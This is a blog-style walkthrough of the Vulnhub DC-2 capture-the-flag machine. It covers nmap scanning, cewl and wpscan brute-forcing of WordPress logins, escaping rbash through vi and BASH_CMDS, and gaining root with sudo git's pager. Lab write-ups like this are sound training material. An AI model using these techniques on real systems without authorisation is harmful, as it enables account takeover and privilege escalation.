---
title: DC-2
tags:
  - Vulnhub
  - DC-2
categories: 
  - 渗透靶机训练
description: Vulnhub DC-2 Challenge
excerpt: Vulnhub DC-2 Challenge
typora-root-url: DC-2
abbrlink: 41337
date: 2021-03-23 16:42:02
---

# DC-2

> Notice: This essay was written in English.

> The file I downloaded from Vulnhub didn't appear some network problem on my VMWare, but if you got some problems with the network, please view this essay:[Fix Network Problem In Vulnhub Virtual Machine](https://evalexp.gitee.io/blog/p/38372/)

## FLAG 1

use **nmap** to scan for some information:

```bash
nmap -sC -sV -A -p- 192.168.145.135 -T5 -oN nmap
```

and this is my result:

![image-20210323164831496](image-20210323164831496.png)

We can ensure that there are web services and SSH services on the server.

Let's go on.

I use browser to view that website, but unfortunately, it will redirect to http://dc-2/.

Then I edit the **\/etc\/hosts** file to make this site work, and here is my hosts file:

![image-20210323165515897](image-20210323165515897.png)

Now, let us reopen the website, and it works.

Got Flag1 easily:

![image-20210323165619745](image-20210323165619745.png)

## FLAG 2

Through the prompt of **FLAG1**, I use **cewl** to generate a wordlist to brute-force.

```bash
cewl http://dc-2/ -w wordlist
```

![image-20210323170257045](image-20210323170257045.png)

Now I get the wordlist, then I use wpscan:

```bash
wpscan --url http://dc-2/
```

I got some information useless.

I try to use wpscan to enumerate the user:

```bash
wpscan --url http://dc-2/ -e u
```

And yes, I got it:

![image-20210323170545765](image-20210323170545765.png)

Then I use wpscan to brute-force password:

```bash
wpscan --url http://dc-2/ -P wordlist
```

And I got :

![image-20210323170938819](image-20210323170938819.png)

Well done, but how can I log in?

I use dirb to scan the web path:

```bash
dirb http://192.168.145.135
```

Then I found this path:

![image-20210323171213244](image-20210323171213244.png)

It redirects to /wp-login.php

I log in as user jerry, and got FLAG2:

![image-20210323171423477](image-20210323171423477.png)

## FLAG 3

Through the prompt of **FLAG2**, I guess another entry point is SSH.

I try to connect SSH service as user jerry but failed, fortunately, user tom could.

Because of the limitation of **rbash**, I could not execute cat command:

![image-20210323171814218](image-20210323171814218.png)

Then I use command **export** to see what **PATH** is and use **ls** to list all the **commands**:

![image-20210323172110109](image-20210323172110109.png)

Well, **less** is available, nice !

Let me see the FLAG 3:

```bash
less flag3.txt
```

![image-20210323172204044](image-20210323172204044.png)

## FLAG 4

So, I need to **su jerry**.

I try to **su jerry** using **vi** editor:

```vi bash
:set shell=/bin/bash
:shell
```

Then we export **\/bin** path to **PATH** var:

```bash
export PATH=$PATH:/bin
```

Then use **su** to change the user(password is in the result of wpscan):

```bash
su jerry
```

![image-20210323173248006](image-20210323173248006.png)

Another method to escape rbash :

```bash
BASH_CMDS[a]=/bin/sh;a
export PATH=$PATH:/bin
```

![image-20210323173421355](image-20210323173421355.png)

Got FLAG 4:

![image-20210323173459296](image-20210323173459296.png)

## FLAG 5

I use **sudo -l** to check the privilege of user jerry:

```bash
sudo -l
```

![image-20210323173638007](image-20210323173638007.png)

Well, command git could run in root without password!

I google some help about git, and I found argument **-p**, and git would use **more** to display the information, so :

```bash
sudo git -p help -a
```

Then execute **\/bin\/bash** in **more**:

```bash
!/bin/bash
```

![image-20210323174109303](image-20210323174109303.png)

And we got root privilege:

![image-20210323174138346](image-20210323174138346.png)

Get Final Flag:

![image-20210323174201803](image-20210323174201803.png)